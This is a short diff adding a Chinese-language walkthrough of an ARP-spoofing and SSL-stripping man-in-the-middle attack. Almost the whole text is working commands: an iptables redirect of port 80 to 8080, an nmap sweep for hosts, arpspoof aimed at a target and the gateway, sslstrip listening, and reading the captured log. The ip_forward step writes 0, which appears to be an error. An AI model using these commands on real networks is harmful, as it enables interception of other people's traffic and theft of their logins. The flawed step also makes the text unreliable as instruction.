@@ -1,0 +1,24 @@
+首先我们需要打开终端,输入 ifconfig 来查看我们的网卡
+ifconfig
+
+eth0代表有线网卡,wlan0代表无线网卡.
+接下来我们需要输入一条命令开启流量转发功能
+
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+接下来配置路由表(iptables),把80端口的数据传送到8080端口,也就是SSL欺骗需要监听的端口
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+现在我们需要找到网关的IP地址,输入 route -n, GateWay 显示的就是网关地址了
+
+route -n
+
+现在使用nmap获取目标主机的地址,在终端输入
+nmap -sP [网关地址]/24
+
+接下来我们进行欺骗
+arpspoof -i [网卡] -t [目标ip] [网关ip]
+
+然后新开一个终端开始监听
+sslstrip -l 8080
+
+打开终端,输入cat sslstrip.log
